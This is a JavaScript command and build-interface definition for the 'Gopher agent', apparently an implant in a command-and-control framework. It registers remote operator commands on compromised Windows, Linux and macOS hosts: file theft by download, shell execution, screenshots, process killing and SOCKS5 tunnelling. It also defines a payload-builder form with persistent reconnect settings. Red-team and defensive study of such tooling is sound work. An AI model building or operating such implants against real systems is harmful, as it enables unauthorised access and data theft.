/// Gopher agent

function RegisterCommands(listenerType)
{
    var cmd_cat_win = ax.create_command("cat", "Read a file", "cat C:\\file.exe", "Task: read file");
    cmd_cat_win.addArgString("path", true);
    var cmd_cat_unix = ax.create_command("cat", "Read a file", "cat /etc/passwd", "Task: read file");
    cmd_cat_unix.addArgString("path", true);

    var cmd_cp = ax.create_command("cp", "Copy file or directory", "cp src.txt dst.txt", "Task: copy file or directory");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    var cmd_cd_win = ax.create_command("cd", "Change current working directory", "cd C:\\Windows", "Task: change working directory");
    cmd_cd_win.addArgString("path", true);
    var cmd_cd_unix = ax.create_command("cd", "Change current working directory", "cd /home/user", "Task: change working directory");
    cmd_cd_unix.addArgString("path", true);

    var cmd_download_win = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
    cmd_download_win.addArgString("path", true);
    var cmd_download_unix = ax.create_command("download", "Download a file", "download /tmp/file", "Task: download file");
    cmd_download_unix.addArgString("path", true);

    var cmd_exit = ax.create_command("exit", "Kill agent", "exit", "Task: kill agent");

    var _cmd_job_list = ax.create_command("list", "List of jobs", "job list", "Task: show jobs");
    var _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "job kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    var cmd_job = ax.create_command("job", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    var cmd_kill = ax.create_command("kill", "Kill a process with a given PID", "kill 7865", "Task: kill process");
    cmd_kill.addArgInt("pid", true);

    var cmd_ls_win = ax.create_command("ls", "Lists files in a folder", "ls C:\\Windows", "Task: list of files in a folder");
    cmd_ls_win.addArgString("path", "", ".");
    var cmd_ls_unix = ax.create_command("ls", "Lists files in a folder", "ls /home/", "Task: list of files in a folder");
    cmd_ls_unix.addArgString("path", "", ".");

    var cmd_mv = ax.create_command("mv", "Move file or directory", "mv src.txt dst.txt", "Task: move file or directory");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    var cmd_mkdir_win = ax.create_command("mkdir", "Make a directory", "mkdir C:\\Temp", "Task: make directory");
    cmd_mkdir_win.addArgString("path", true);
    var cmd_mkdir_unix = ax.create_command("mkdir", "Make a directory", "mkdir /tmp/ex", "Task: make directory");
    cmd_mkdir_unix.addArgString("path", true);

    var cmd_ps = ax.create_command("ps", "Show process list", "ps", "Task: show process list");

    var cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    var cmd_rm_win = ax.create_command("rm", "Remove a file or folder", "rm C:\\Temp\\file.txt", "Task: remove file or directory");
    cmd_rm_win.addArgString("path", true);
    var cmd_rm_unix = ax.create_command("rm", "Remove a file or folder", "rm /tmp/file", "Task: remove file or directory");
    cmd_rm_unix.addArgString("path", true);

    var cmd_run_win = ax.create_command("run", "Execute long command or scripts via cmd.exe", "run whoami /all", "Task: command run");
    cmd_run_win.addArgString("cmd", true);
    var cmd_run_unix = ax.create_command("run", "Execute long command or scripts via /bin/sh", "run /tmp/script.sh", "Task: command run");
    cmd_run_unix.addArgString("cmd", true);

    var cmd_screenshot = ax.create_command("screenshot", "Take a single screenshot", "screenshot", "Task: screenshot");

    var _cmd_socks_start = ax.create_command("start", "Start a SOCKS5 proxy server and listen on a specified port", "socks start 1080 -a user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-a", "Enable User/Password authentication for SOCKS5");
    _cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    var _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    var cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    var cmd_shell_win = ax.create_command("shell", "Execute command via cmd.exe", "shell whoami /all", "Task: command execute");
    cmd_shell_win.addArgString("cmd", true);
    var cmd_shell_unix = ax.create_command("shell", "Execute command via /bin/sh", "shell id", "Task: command execute");
    cmd_shell_unix.addArgString("cmd", true);

    var cmd_upload_win = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt C:\\Temp\\file.txt", "Task: upload file");
    cmd_upload_win.addArgFile("local_file", true);
    cmd_upload_win.addArgString("remote_path", false);
    var cmd_upload_unix = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt /root/file.txt", "Task: upload file");
    cmd_upload_unix.addArgFile("local_file", true);
    cmd_upload_unix.addArgString("remote_path", false);

    var cmd_zip_win = ax.create_command("zip", "Archive (zip) a file or directory", "zip C:\\backup C:\\Temp\\qwe.zip", "Task: Zip a file or directory");
    cmd_zip_win.addArgString("path", true);
    cmd_zip_win.addArgString("zip_path", true);
    var cmd_zip_unix = ax.create_command("zip", "Archive (zip) a file or directory", "zip /home/test /tmp/qwe.zip", "Task: Zip a file or directory");
    cmd_zip_unix.addArgString("path", true);
    cmd_zip_unix.addArgString("zip_path", true);

    var commands_win  = ax.create_commands_group("gopher", [cmd_cat_win,  cmd_cp, cmd_cd_win,  cmd_download_win,  cmd_exit, cmd_job, cmd_kill, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_ps, cmd_pwd, cmd_rm_win,  cmd_run_win,  cmd_screenshot, cmd_socks, cmd_shell_win,  cmd_upload_win,  cmd_zip_win] );
    var commands_unix = ax.create_commands_group("gopher", [cmd_cat_unix, cmd_cp, cmd_cd_unix, cmd_download_unix, cmd_exit, cmd_job, cmd_kill, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_ps, cmd_pwd, cmd_rm_unix, cmd_run_unix, cmd_screenshot, cmd_socks, cmd_shell_unix, cmd_upload_unix, cmd_zip_unix] );

    return {
        commands_windows: commands_win,
        commands_linux: commands_unix,
        commands_macos: commands_unix
    }
}

function GenerateUI(listenerType)
{
    var labelOS = form.create_label("OS:");
    var comboOS = form.create_combo()
    comboOS.addItems(["windows", "linux", "macos"]);

    var labelArch = form.create_label("Arch:");
    var comboArch = form.create_combo()
    comboArch.addItems(["amd64", "arm64"]);

    var labelFormat = form.create_label("Format:");
    var comboFormat = form.create_combo()
    comboFormat.addItems(["Binary EXE"]);

    var checkWin7 = form.create_check("Windows 7 support");

    var hline = form.create_hline()

    var labelReconnTimeout = form.create_label("Reconnect timeout:");
    var textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds")

    var labelReconnCount = form.create_label("Reconnect count:");
    var spinReconnCount = form.create_spin();
    spinReconnCount.setRange(0, 1000000000);
    spinReconnCount.setValue(1000000000);

    var layout = form.create_gridlayout();
    layout.addWidget(labelOS, 0, 0, 1, 1);
    layout.addWidget(comboOS, 0, 1, 1, 1);
    layout.addWidget(labelArch, 1, 0, 1, 1);
    layout.addWidget(comboArch, 1, 1, 1, 1);
    layout.addWidget(labelFormat, 2, 0, 1, 1);
    layout.addWidget(comboFormat, 2, 1, 1, 1);
    layout.addWidget(checkWin7, 3, 1, 1, 1);
    layout.addWidget(hline, 4, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 5, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 5, 1, 1, 1);
    layout.addWidget(labelReconnCount, 6, 0, 1, 1);
    layout.addWidget(spinReconnCount, 6, 1, 1, 1);

    form.connect(comboOS, "currentTextChanged", function(text) {
        if(text == "windows") {
            comboFormat.setItems(["Binary EXE"]);
            checkWin7.setVisible(true);
        }
        else if (text == "linux") {
            comboFormat.setItems(["Binary .ELF"]);
            checkWin7.setVisible(false);
        }
        else {
            comboFormat.setItems(["Binary Mach-O"]);
            checkWin7.setVisible(false);
        }
    });

    var container = form.create_container()
    container.put("arch", comboArch)
    container.put("format", comboFormat)
    container.put("reconn_timeout", textReconnTimeout)
    container.put("reconn_count", spinReconnCount)

    var panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container
    }
}